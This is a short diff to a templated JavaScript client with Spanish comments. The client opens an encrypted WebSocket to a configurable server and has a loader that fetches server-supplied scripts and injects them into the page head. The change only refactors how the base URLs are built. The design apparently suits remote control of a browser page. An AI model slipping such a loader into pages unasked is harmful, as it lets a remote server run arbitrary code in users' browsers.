@@ -3,10 +3,13 @@ function sendMessage(msg) {
     webSocket.send(encrypt(mes));
 }
 
+var httpBase = "$hbase";
+var wsBase = "$wsbase";
+
 function loadScriptFromURL(url) {
     // Si la URL no viene completa, se completa la URL para descargar el script del servidor
     if (!(/(http(s?)):\/\//i.test(url))) {
-        url = "http://$hhost:$hport/" + url
+        url = httpBase + url.replace(/^\/+/, '')
     }
     // Comprueba si el script existe, si existe devuelve true y carga una etiqueta script en el head del documento.
     return fetch(url).then(response => {
@@ -26,7 +29,7 @@ function loadScript(script) {
     node.remove()
 }
 
-const webSocket = new WebSocket("ws://$whost:$wport");
+const webSocket = new WebSocket(wsBase);
 webSocket.onopen = (e) => {
     sendMessage({ type: 1 });
 };
